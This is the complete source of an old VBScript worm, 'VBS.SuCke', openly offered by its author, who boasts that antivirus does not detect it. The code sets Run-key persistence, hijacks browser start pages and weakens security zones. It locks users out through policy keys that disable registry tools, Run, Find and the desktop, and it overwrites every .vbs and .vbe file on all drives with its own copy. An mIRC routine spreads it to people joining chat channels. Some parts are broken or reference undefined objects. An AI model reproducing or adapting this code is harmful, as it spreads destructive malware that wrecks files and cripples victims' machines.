'~VBS.SuCke.b by sevenC / N0:7~
'~http://sevenc.vze.com/~
'~http://trax.to/sevenC~
'~sevenC_zone@yahoo.com~
'~Just to be learned..~
'~FuCke of mY oWn LiVe~
'~This is very simple and fast VBS.worm that I've made
'~I have NAV 2003 and Mcafee but Now day Both of them still never detect 
'~My sucke...I don't know why...who care...!!

On Error Resume Next
Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set sucke = wscript.CreateObject("WScript.Shell")
Set Fso = CreateObject("scripting.FileSystemObject")
Set Drives=fso.drives
Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)
src = dropper.readall
set Trange = document.body.CreateTextRange
sucke.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
sucke.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "sevenc.vze.com"
sucke.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "sectors.vze.com"
sucke.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "sevenC"
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:\Windows\Shell32.vbs"
Fso.copyfile wscript.scriptfullname, "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
Fso.copyfile wscript.scriptfullname, "C:\windows\Shell32.vbs"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDiskCpl", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
If sucke.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\sucke\sevenC") <> 1 then
chr(65) & chr(66) & chr(67) & chr(68) & chr(69)
End if
Set Fso = createobject("scripting.filesystemobject") 
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 
  
Function Dosearch(Path) 
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then 
on error resume next
		Set dropper = Fso.createtextfile(file.path, True)
		dropper.write src
		dropper.Close
end if
next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function 

function ABCDE(QR2T8452)
on error resume next
If QR2T8452 <> "" Then
J574I3N1 = KGB01V84.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If fso.fileexists("c:\mirc\mirc.ini") Then
QR2T8452 = "c:\mirc"
ElseIf fso.fileexists("c:\mirc32\mirc.ini") Then
QR2T8452 = "c:\mirc32"
ElseIf fso.fileexists(J574I3N1 & "\mirc\mirc.ini") Then
QR2T8452 = J574I3N1 & "\mirc"
ElseIf fso.fileexists(J574I3N1 & "\mirc32\mirc.ini") Then
QR2T8452 = J574I3N1 & "\mirc"
Else
QR2T8452 = ""
End If
End If
If QR2T8452 <> "" Then
Set N3EGB01V = UT8452J7.CreateTextFile(QR2T8452 & "\script.ini", True)
N3EGB01V = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
N3EGB01V = N3EGB01V & vbCrLf & "n0=on 1:JOIN:#:{"
N3EGB01V = N3EGB01V & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
N3EGB01V = N3EGB01V & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
N3EGB01V = N3EGB01V & HFNN6A27
N3EGB01V = N3EGB01V & vbCrLf & "n3=}"
script.Close
End If
End Function

'~vbs.sucke.c.vbs~ by sevenC / N0:7
'~Copyright(c)2003 by N0:7 Laboratoryoum